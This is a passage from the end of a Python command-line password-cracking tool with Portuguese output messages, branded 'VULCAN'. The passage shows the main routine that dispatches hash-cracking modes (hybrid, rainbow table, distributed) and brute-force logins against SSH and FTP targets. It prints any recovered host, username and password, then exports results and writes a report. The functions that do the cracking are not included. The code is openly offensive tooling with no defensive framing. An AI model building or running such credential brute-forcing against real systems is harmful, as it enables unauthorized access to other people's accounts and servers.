                result = tool.hybrid_attack(args.hash, args.wordlist, args.algorithm)
            elif args.mode == 'rainbow':
                result = tool.rainbow_table_attack(args.hash)
            elif args.mode == 'distributed':
                result = tool.distributed_attack(args.hash, args.algorithm, args.nodes)
            elif args.mode == 'intelligent':
                result = tool.intelligent_brute(args.hash, args.algorithm)
            
            if result:
                tool.results.append({
                    'hash': args.hash,
                    'password': result,
                    'algorithm': args.algorithm,
                    'mode': args.mode,
                    'attempts': tool.attempts,
                    'time': time.time() - tool.start_time
                })
                tool.session_stats['successful_cracks'] += 1
        
        elif args.target and args.service:
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando ataque de rede...")
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Serviço: {args.service}")
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Alvo: {args.target}")
            
            if args.service == 'ssh':
                if not args.username or not args.wordlist:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} Username e wordlist necessários para SSH")
                    sys.exit(1)
                
                results = tool.network_attacker.ssh_brute(
                    args.target, args.port or 22, args.username, args.wordlist
                )
            elif args.service == 'ftp':
                if not args.username or not args.wordlist:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} Username e wordlist necessários para FTP")
                    sys.exit(1)
                
                results = tool.network_attacker.ftp_brute(
                    args.target, args.port or 21, args.username, args.wordlist
                )
            
            if results:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Ataque de rede bem-sucedido!")
                for result in results:
                    print(f"    • Host: {result['host']}:{result['port']}")
                    print(f"    • Usuário: {result['username']}")
                    print(f"    • Senha: {result['password']}")
        
        # Atualizar estatísticas
        tool.session_stats['total_attempts'] = tool.attempts
        if tool.start_time:
            elapsed = time.time() - tool.start_time
            tool.session_stats['average_speed'] = tool.attempts / elapsed if elapsed > 0 else 0
        
        # Exportar resultados
        if args.export:
            tool.export_results(args.export)
        
        # Gerar relatório
        if not args.no_report:
            tool.generate_report()
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Operação VULCAN concluída com sucesso!")
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Tempo total: {time.time() - tool.start_time:.2f} segundos")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Operação interrompida pelo usuário")
        tool.generate_report(detailed=False)
    except Exception as e:
        print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Erro crítico: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
